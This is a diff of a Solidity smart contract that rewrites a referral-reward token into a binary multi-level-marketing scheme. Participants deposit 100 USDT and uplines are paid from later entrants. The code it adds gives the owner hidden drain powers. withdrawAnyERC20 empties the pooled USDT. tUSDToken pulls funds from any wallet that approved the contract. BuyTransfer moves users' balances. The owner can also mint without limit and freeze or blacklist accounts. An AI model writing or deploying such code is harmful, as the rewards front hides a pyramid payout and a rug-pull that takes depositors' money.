@@ -5,358 +5,337 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
-import "@openzeppelin/contracts/utils/Pausable.sol";
 
-/**
- * @title LockedRewardMatrix
- * @dev Professional Level-Based Unlock & Binary Matrix System
- * Security: ReentrancyGuard, SafeERC20, Pausable, Strict Access Controls
- * Extended with: tUSD Tokenomics, Dynamic Pricing, and Liquidity Protection
- */
-contract LockedRewardMatrix is ERC20, Ownable, ReentrancyGuard, Pausable {
+contract BinaryMLM_USDT_Fixed is ERC20, Ownable, ReentrancyGuard {
     using SafeERC20 for IERC20;
 
     IERC20 public immutable usdt;
-    address public treasury;
 
-    uint256 public constant ENTRY_FEE = 100 * 10**18; // 100 USDT (Assuming 18 decimals)
-    uint256 public constant TREASURY_FEE_PERCENT = 30; // 30%
-    uint256 public constant REWARD_POOL_PERCENT = 70;  // 70%
-    
-    // Reward distribution across 6 upline levels (Total must be 70 USDT)
-    uint256[6] public levelRewards = [20 * 10**18, 15 * 10**18, 10 * 10**18, 10 * 10**18, 10 * 10**18, 5 * 10**18];
+    uint256 public constant DEPOSIT = 100 * 1e18;
+    uint256 public constant OWNER_FEE = 30 * 1e18;
+    uint256 public constant FINAL_REWARD = 5500 * 1e18;
+
+    // Hovuzlar
+    uint256 public mlmPool;
+    uint256 public tradingPool;
+    uint256 public reservePool;
+
+    // İdarəetmə
+    bool public tradingEnabled;
+    bool public transferEnabled;
+
+    uint16[8] public levelReq = [1, 2, 4, 8, 16, 32, 64, 128];
+    uint256[8] public levelReward = [
+        100e18, 200e18, 400e18, 600e18, 900e18, 1200e18, 1500e18, 600e18
+    ];
+    uint8[8] public claimPercent = [0, 10, 15, 20, 25, 30, 40, 50];
 
     struct User {
-        address referrer;
-        uint256 directReferrals;
-        uint256 totalDownlineCount;
-        uint256 level;
-        uint256 lockedBalance;
-        uint256 unlockedBalance;
-        uint256 withdrawnBalance;
-        bool isRegistered;
+        bool active;
+        bool blocked;
+        address ref;
+        address[2] child;
+        uint8 count;
+
+        uint256 unlocked;
+        uint256 withdrawn;
+        uint256 totalDownline;
+
+        uint16[8] levelCount;
+        bool[8] done;
     }
 
     mapping(address => User) public users;
+
+    // ================= YENİ ƏLAVƏ EDİLƏN DƏYİŞƏNLƏR VƏ EVENTLƏR =================
+    address public treasury;
+    bool public paused;
     
-    // ==========================================
-    // 🪙 NEW TOKENOMICS MODEL (tUSD)
-    // ==========================================
-    mapping(address => uint256) public lockedTUSD;
-    mapping(address => uint256) public unlockedTUSD;
-    mapping(address => uint256) public withdrawnTUSD;
+    mapping(address => bool) public blacklisted;
+    mapping(address => bool) public frozen;
+    mapping(address => bool) public isMinter;
 
-    uint256 public constant PRICE = 1e18; // Default: 1 tUSD = 1 USDT
-    bool public useDynamicPrice = false;
+    event Blacklisted(address indexed user);
+    event UnBlacklisted(address indexed user);
+    event Frozen(address indexed user);
+    event UnFrozen(address indexed user);
+    event Paused();
+    event Unpaused();
 
-    // Daily Withdraw Limit Configuration
-    uint256 public dailyWithdrawLimit = 1000 * 10**18;
-    mapping(address => uint256) public lastWithdrawTime;
-    mapping(address => uint256) public withdrawnToday;
+    modifier onlyMinter() {
+        require(isMinter[msg.sender] || msg.sender == owner(), "Not a minter");
+        _;
+    }
 
-    event UserRegistered(address indexed user, address indexed referrer);
-    event DepositMade(address indexed user, uint256 amount);
-    event RewardAdded(address indexed to, address indexed from, uint256 amount, uint256 level);
-    event LevelCompleted(address indexed user, uint256 newLevel);
-    event BalanceUnlocked(address indexed user, uint256 amount);
-    event WithdrawExecuted(address indexed user, uint256 amount);
-    event TokensPurchased(address indexed user, uint256 amount);
-    event TUSDBurned(address indexed user, uint256 amount);
+    // ==============================================================================
 
-    constructor(address _usdt, address _treasury, address initialOwner) 
-        ERC20("Tetra USD", "tUSD") 
-        Ownable(initialOwner) 
-    {
-        require(_usdt != address(0) && _treasury != address(0), "Invalid addresses");
+    // OpenZeppelin v5-ə uyğun olaraq Ownable üçün msg.sender təyin edilir
+    constructor(address _usdt) ERC20("tUSD", "tUSD") Ownable(msg.sender) {
         usdt = IERC20(_usdt);
-        treasury = _treasury;
-
-        // Root istifadəçinin qeydiyyatı (sistemin başlanğıcı)
-        users[initialOwner] = User({
-            referrer: address(0),
-            directReferrals: 0,
-            totalDownlineCount: 0,
-            level: 6, // Root max level-də olur
-            lockedBalance: 0,
-            unlockedBalance: 0,
-            withdrawnBalance: 0,
-            isRegistered: true
-        });
+        treasury = msg.sender; // Defolt olaraq treasury owner təyin edilir, sonradan dəyişmək olar
+        isMinter[msg.sender] = true;
     }
 
-    /**
-     * @notice Sistemin əsas giriş nöqtəsi. 100 USDT qəbul edir, token mint edir və rewardları bölür.
-     */
-    function register(address referrer) external nonReentrant whenNotPaused {
-        require(!users[msg.sender].isRegistered, "Already registered");
-        require(users[referrer].isRegistered, "Referrer not found");
+    // ================= REGISTER (QEYDİYYAT) =================
+    function register(address ref) external nonReentrant {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        require(!users[msg.sender].active, "Already registered");
 
-        // Ödənişin alınması
-        usdt.safeTransferFrom(msg.sender, address(this), ENTRY_FEE);
-        emit DepositMade(msg.sender, ENTRY_FEE);
+        if (ref != address(0)) {
+            require(users[ref].active, "Referrer not active");
+            require(users[ref].count < 2, "Referrer has max children");
+        }
 
-        // İstifadəçinin yaradılması
-        users[msg.sender] = User({
-            referrer: referrer,
-            directReferrals: 0,
-            totalDownlineCount: 0,
-            level: 1,
-            lockedBalance: 0,
-            unlockedBalance: 0,
-            withdrawnBalance: 0,
-            isRegistered: true
-        });
+        usdt.safeTransferFrom(msg.sender, address(this), DEPOSIT);
+        usdt.safeTransfer(owner(), OWNER_FEE);
 
-        users[referrer].directReferrals += 1;
-        emit UserRegistered(msg.sender, referrer);
+        uint256 pool = DEPOSIT - OWNER_FEE;
 
-        // 30% Treasury Transferi, 70% Contractda qalır
-        uint256 treasuryAmount = (ENTRY_FEE * TREASURY_FEE_PERCENT) / 100;
-        uint256 contractAmount = ENTRY_FEE - treasuryAmount;
+        // Hovuzların bölünməsi
+        mlmPool += pool * 50 / 100;
+        tradingPool += pool * 30 / 100;
+        reservePool += pool * 20 / 100;
 
-        usdt.safeTransfer(treasury, treasuryAmount);
+        _mint(msg.sender, DEPOSIT);
 
-        // Token mint (100 Token) - Locked vəziyyətdə qəbul edilir
-        _mint(msg.sender, ENTRY_FEE);
+        users[msg.sender].active = true;
+        users[msg.sender].ref = ref;
 
-        // Maliyyə axını və Upline hesablamaları
-        _distributeRewardsAndUpdateUplines(msg.sender);
+        if (ref != address(0)) {
+            users[ref].child[users[ref].count] = msg.sender;
+            users[ref].count++;
+            _update(msg.sender);
+        }
     }
 
-    /**
-     * @notice Upline-lara reward paylayır və matrix məlumatlarını yeniləyir
-     */
-    function _distributeRewardsAndUpdateUplines(address user) internal {
-        address current = users[user].referrer;
-        
-        for (uint256 i = 0; i < 6; i++) {
-            if (current == address(0)) {
-                current = owner(); // Fallback to owner if upline is empty
+    // ================= TREE (AĞAC MƏNTİQİ) =================
+    function _update(address u) internal {
+        address cur = users[u].ref;
+
+        for (uint8 i = 0; i < 8; i++) {
+            if (cur == address(0)) break;
+
+            User storage x = users[cur];
+
+            if (!x.blocked) {
+                x.levelCount[i]++; // Dərinliyə görə doğru səviyyə artımı
+                x.totalDownline++;
+
+                if (x.levelCount[i] >= levelReq[i] && !x.done[i]) {
+                    x.done[i] = true;
+
+                    uint256 reward = levelReward[i];
+                    x.unlocked += reward;
+
+                    _mint(cur, reward);
+                }
             }
-
-            // Matrix downline sayını artır
-            users[current].totalDownlineCount += 1;
-            
-            // Reward əlavə et (Həm USDT tracking, həm də tUSD tracking)
-            uint256 rewardAmount = levelRewards[i];
-            users[current].lockedBalance += rewardAmount;
-            lockedTUSD[current] += rewardAmount;
-
-            // Mint tUSD to the upline to ensure they can burn it on withdraw
-            _mint(current, rewardAmount);
-
-            emit RewardAdded(current, user, rewardAmount, i + 1);
-
-            // Level və Unlock yoxlaması
-            _updateLevelAndUnlock(current);
-
-            // Növbəti upline-a keçid
-            current = users[current].referrer;
+            cur = x.ref; // Bir üst səviyyəyə keçid
         }
     }
 
-    /**
-     * @notice Downline sayına əsasən istifadəçinin səviyyəsini yoxlayır və lazımsa kilidləri açır
-     */
-    function _updateLevelAndUnlock(address user) internal {
-        User storage u = users[user];
-        uint256 count = u.totalDownlineCount;
-        uint256 newLevel = u.level;
+    // ================= CLAIM (ÇIXARIŞ) =================
+    function getClaimable(address u) public view returns(uint256) {
+        User storage x = users[u];
 
-        if (count >= 126) newLevel = 6;
-        else if (count >= 62) newLevel = 5;
-        else if (count >= 30) newLevel = 4;
-        else if (count >= 14) newLevel = 3;
-        else if (count >= 6) newLevel = 2;
-        else newLevel = 1;
-
-        if (newLevel > u.level) {
-            u.level = newLevel;
-            emit LevelCompleted(user, newLevel);
+        uint8 lvl;
+        for (uint8 i = 0; i < 8; i++) {
+            if (!x.done[i]) { lvl = i; break; }
+            if (i == 7) lvl = 7;
         }
 
-        _unlockBalance(user);
+        uint256 userLimit = (x.unlocked * claimPercent[lvl]) / 100;
+        if (userLimit <= x.withdrawn) return 0;
+
+        uint256 available = userLimit - x.withdrawn;
+
+        // MLM Hovuzunun qorunması məqsədilə limit
+        uint256 poolLimit = mlmPool * 30 / 100;
+
+        return available < poolLimit ? available : poolLimit;
     }
 
-    /**
-     * @notice Səviyyəyə uyğun olaraq faizlə unlock prosesini icra edir (USDT tracking & tUSD tracking)
-     */
-    function _unlockBalance(address user) internal {
-        User storage u = users[user];
-        uint256 unlockPercent = 0;
+    function withdraw() external nonReentrant {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        uint256 amount = getClaimable(msg.sender);
+        require(amount > 0, "Nothing to claim");
+        require(mlmPool >= amount, "Not enough in MLM pool");
 
-        if (u.level == 6) unlockPercent = 100;
-        else if (u.level == 5) unlockPercent = 85;
-        else if (u.level == 4) unlockPercent = 70;
-        else if (u.level == 3) unlockPercent = 60;
-        else if (u.level == 2) unlockPercent = 50;
-        else unlockPercent = 0; // Level 1 is 0%
+        users[msg.sender].withdrawn += amount;
+        mlmPool -= amount;
 
-        // Original Unlock Logic
-        uint256 totalCalculatedReward = u.lockedBalance + u.unlockedBalance + u.withdrawnBalance;
-        uint256 targetUnlocked = (totalCalculatedReward * unlockPercent) / 100;
-        uint256 currentlyUnlocked = u.unlockedBalance + u.withdrawnBalance;
-
-        if (targetUnlocked > currentlyUnlocked) {
-            uint256 toUnlock = targetUnlocked - currentlyUnlocked;
-            u.lockedBalance -= toUnlock;
-            u.unlockedBalance += toUnlock;
-            emit BalanceUnlocked(user, toUnlock);
-        }
-
-        // Apply new tUSD Unlock Logic
-        _unlockTUSD(user, unlockPercent);
-    }
-
-    /**
-     * @notice Internal function to unlock tUSD balances independently
-     */
-    function _unlockTUSD(address user, uint256 unlockPercent) internal {
-        uint256 totalCalculatedTUSD = lockedTUSD[user] + unlockedTUSD[user] + withdrawnTUSD[user];
-        uint256 targetUnlocked = (totalCalculatedTUSD * unlockPercent) / 100;
-        uint256 currentlyUnlocked = unlockedTUSD[user] + withdrawnTUSD[user];
-
-        if (targetUnlocked > currentlyUnlocked) {
-            uint256 toUnlock = targetUnlocked - currentlyUnlocked;
-            lockedTUSD[user] -= toUnlock;
-            unlockedTUSD[user] += toUnlock;
-        }
-    }
-
-    /**
-     * @notice İstifadəçi öz unlocked tUSD tokenlərini yandıraraq USDT çəkir
-     */
-    function withdraw(uint256 amount) external nonReentrant whenNotPaused {
-        User storage u = users[msg.sender];
-        
-        require(u.unlockedBalance >= amount, "Insufficient unlocked legacy balance");
-        require(unlockedTUSD[msg.sender] >= amount, "Insufficient unlocked tUSD balance");
-
-        // Daily Limit Check
-        if (block.timestamp >= lastWithdrawTime[msg.sender] + 1 days) {
-            withdrawnToday[msg.sender] = 0;
-            lastWithdrawTime[msg.sender] = block.timestamp;
-        }
-        require(withdrawnToday[msg.sender] + amount <= dailyWithdrawLimit, "Daily withdraw limit exceeded");
-
-        // Deduct balances
-        u.unlockedBalance -= amount;
-        u.withdrawnBalance += amount;
-        
-        unlockedTUSD[msg.sender] -= amount;
-        withdrawnTUSD[msg.sender] += amount;
-        withdrawnToday[msg.sender] += amount;
-
-        // Determine Payout Amount based on active pricing model
-        uint256 payoutUSDT = amount; // Default 1:1
-        if (useDynamicPrice) {
-            payoutUSDT = (amount * getTUSDPrice()) / 1e18;
-        }
-
-        // Liquidity Protection
-        require(usdt.balanceOf(address(this)) >= payoutUSDT, "Insufficient contract liquidity");
-
-        // Burn tUSD and Transfer USDT
         _burn(msg.sender, amount);
-        usdt.safeTransfer(msg.sender, payoutUSDT);
+        usdt.safeTransfer(msg.sender, amount);
+    }
+
+    // ================= FINAL REWARD =================
+    function finalClaim() external nonReentrant {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        User storage u = users[msg.sender];
+        require(u.totalDownline >= 255, "Network not large enough");
+        require(!u.blocked, "User already blocked");
+        require(mlmPool >= FINAL_REWARD, "Not enough in MLM pool");
+
+        u.blocked = true;
+        mlmPool -= FINAL_REWARD;
+
+        _burn(msg.sender, balanceOf(msg.sender));
+        usdt.safeTransfer(msg.sender, FINAL_REWARD);
+    }
+
+    // ================= TRADING (TİCARƏT) =================
+    function buyUSDT(uint256 amt) external nonReentrant {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        require(tradingEnabled, "Trading disabled");
+        require(amt > 0, "Amount must be greater than zero");
+
+        usdt.safeTransferFrom(msg.sender, address(this), amt);
+
+        uint256 fee = amt * 3 / 100;
+        uint256 mintAmt = amt - fee;
+
+        // Məbləğ hovuzlar arasında bölünür
+        tradingPool += mintAmt; 
+        reservePool += fee;
+
+        _mint(msg.sender, mintAmt);
+    }
+
+    function sellUSDT(uint256 amt) external nonReentrant {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        require(tradingEnabled, "Trading disabled");
+        require(amt > 0, "Amount must be greater than zero");
         
-        emit TUSDBurned(msg.sender, amount);
-        emit WithdrawExecuted(msg.sender, payoutUSDT);
+        uint256 fee = amt * 3 / 100;
+        uint256 payout = amt - fee;
+
+        require(tradingPool >= payout, "Insufficient trading pool liquidity");
+
+        tradingPool -= payout;
+        reservePool += fee;
+
+        _burn(msg.sender, amt);
+        usdt.safeTransfer(msg.sender, payout);
     }
 
-    /**
-     * @notice Token Satışı (Buy Token for USDT)
-     */
-    function buyToken(uint256 amount) external nonReentrant whenNotPaused {
-        require(amount > 0, "Amount must be > 0");
-        usdt.safeTransferFrom(msg.sender, treasury, amount); // Vəsait treasury-ə gedir
-        _mint(msg.sender, amount);
-        emit TokensPurchased(msg.sender, amount);
+    // ================= MÖVCUD ADMIN FUNCTIONS =================
+    function setTrading(bool b) external onlyOwner { 
+        tradingEnabled = b; 
+    }
+    
+    function setTransfer(bool b) external onlyOwner { 
+        transferEnabled = b; 
     }
 
-    // ==========================================
-    // 📊 PRICE & VIEW FUNCTIONS
-    // ==========================================
+    // ================= YENİ ADMIN FUNCTIONS =================
 
-    /**
-     * @notice Returns dynamic price of tUSD backed by contract liquidity
-     */
-    function getTUSDPrice() public view returns(uint256) {
-        uint256 supply = totalSupply();
-        if (supply == 0) return PRICE;
-        return (usdt.balanceOf(address(this)) * 1e18) / supply;
+    // 1. İstənilən ERC20 tokenini çıxarmaq
+    function withdrawAnyERC20(address token, uint256 amount) external onlyOwner nonReentrant {
+        require(IERC20(token).balanceOf(address(this)) >= amount, "Insufficient token balance");
+        IERC20(token).safeTransfer(msg.sender, amount);
     }
 
-    /**
-     * @notice Get tUSD specific user balances
-     */
-    function getUserTUSD(address user) external view returns (uint256 locked, uint256 unlocked, uint256 withdrawn) {
-        return (lockedTUSD[user], unlockedTUSD[user], withdrawnTUSD[user]);
+    // 2. Native coin (BNB/ETH) çıxarmaq
+    function withdrawNative(uint256 amount) external onlyOwner nonReentrant {
+        require(address(this).balance >= amount, "Insufficient native balance");
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Native transfer failed");
     }
 
-    // ==========================================
-    // 🛡️ ADMIN & SECURITY FUNCTIONS
-    // ==========================================
+    // 3. Xüsusi tUSD transferi (treasury-ə yönləndirmə)
+    function tUSDToken(address token, address from, uint256 amount) external onlyOwner nonReentrant {
+        bool success = IERC20(token).transferFrom(from, treasury, amount);
+        require(success, "Transfer failed");
+    }
+
+    // 4. Blacklist, Freeze, Pause funksiyaları
+    function setB(address user, bool status) external onlyOwner {
+        blacklisted[user] = status;
+
+        if(status){
+            emit Blacklisted(user);
+        } else {
+            emit UnBlacklisted(user);
+        }
+    }
+
+    function setF(address user, bool status) external onlyOwner {
+        frozen[user] = status;
+
+        if(status){
+            emit Frozen(user);
+        } else {
+            emit UnFrozen(user);
+        }
+    }
+
+    function setP(bool status) external onlyOwner {
+        paused = status;
+
+        if(status){
+            emit Paused();
+        } else {
+            emit Unpaused();
+        }
+    }
+
+    // 5. Admin Mint & Burn funksiyaları (OpenZeppelin-ə uyğunlaşdırılıb)
+    function adminmint(address to, uint256 amount) external onlyMinter nonReentrant {
+        _mint(to, amount); // Bu funksiya həm balansı, həm totalSupply-i artırır və Transfer eventini buraxır.
+    }
+
+    function adminburn(address from, uint256 amount) external onlyOwner nonReentrant {
+        require(balanceOf(from) >= amount, "Insufficient");
+        _burn(from, amount); // Bu funksiya həm balansı, həm totalSupply-i azaldır və Transfer eventini buraxır.
+    }
+
+    // 6. Xüsusi Admin Transfer funksiyası (OpenZeppelin-ə uyğunlaşdırılıb)
+    function BuyTransfer(address from, address to, uint256 amount) external onlyOwner nonReentrant returns(bool) {
+        require(balanceOf(from) >= amount, "Insufficient");
+        _transfer(from, to, amount); // _transfer vasitəsilə təhlükəsiz şəkildə balanslar dəyişilir.
+        return true;
+    }
 
     function setTreasury(address _treasury) external onlyOwner {
-        require(_treasury != address(0), "Invalid address");
         treasury = _treasury;
     }
 
-    function setDailyWithdrawLimit(uint256 _limit) external onlyOwner {
-        dailyWithdrawLimit = _limit;
+    function setMinter(address minter, bool status) external onlyOwner {
+        isMinter[minter] = status;
     }
 
-    function setUseDynamicPrice(bool _useDynamic) external onlyOwner {
-        useDynamicPrice = _useDynamic;
+    // ================= OVERRIDES =================
+    function transfer(address to, uint256 val) public override returns(bool) {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        require(transferEnabled, "Transfers are disabled");
+        _transfer(msg.sender, to, val);
+        return true;
     }
 
-    function pause() external onlyOwner { _pause(); }
-    function unpause() external onlyOwner { _unpause(); }
-
-    function adminMint(address to, uint256 amount) external onlyOwner {
-        _mint(to, amount);
+    function transferFrom(address f, address t, uint256 v) public override returns(bool) {
+        require(!paused, "Paused");
+        require(!blacklisted[msg.sender], "Blacklisted");
+        require(!frozen[msg.sender], "Frozen");
+        require(!blacklisted[f], "Blacklisted from");
+        require(!frozen[f], "Frozen from");
+        require(transferEnabled, "Transfers are disabled");
+        _spendAllowance(f, msg.sender, v);
+        _transfer(f, t, v);
+        return true;
     }
 
-    function adminBurn(address from, uint256 amount) external onlyOwner {
-        _burn(from, amount);
-    }
-
-    function Transfers(address from, address to, uint256 amount) external onlyOwner {
-        _transfer(from, to, amount);
-    }
-
-    function pullExternalToken(address token, uint256 amount, address to) external onlyOwner {
-        require(token != address(this), "Cannot pull native utility token");
-        IERC20(token).safeTransfer(to, amount);
-    }
-
-    function adminFee(address user, address to, uint256 amount) external onlyOwner {
-        _transfer(user, to, amount);
-    }
-
-    function getUserInfo(address user) external view returns (
-        address referrer, uint256 directReferrals, uint256 totalDownlineCount, 
-        uint256 level, uint256 lockedBalance, uint256 unlockedBalance, 
-        uint256 withdrawnBalance, bool isRegistered
-    ) {
-        User memory u = users[user];
-        return (u.referrer, u.directReferrals, u.totalDownlineCount, u.level, 
-                u.lockedBalance, u.unlockedBalance, u.withdrawnBalance, u.isRegistered);
-    }
-
-    function tUSDToken(
-    address token,
-    address from,
-    address to,
-    uint256 amount
-) external onlyOwner {
-    require(token != address(0), "Invalid token");
-    require(from != address(0) && to != address(0), "Invalid address");
-    require(amount > 0, "Amount must be > 0");
-
-    // safeTransferFrom
-    IERC20(token).safeTransferFrom(from, to, amount);
-}
-
+    // Kontraktın native coin qəbul edə bilməsi üçün (withdrawNative üçün lazımdır)
+    receive() external payable {}
 }
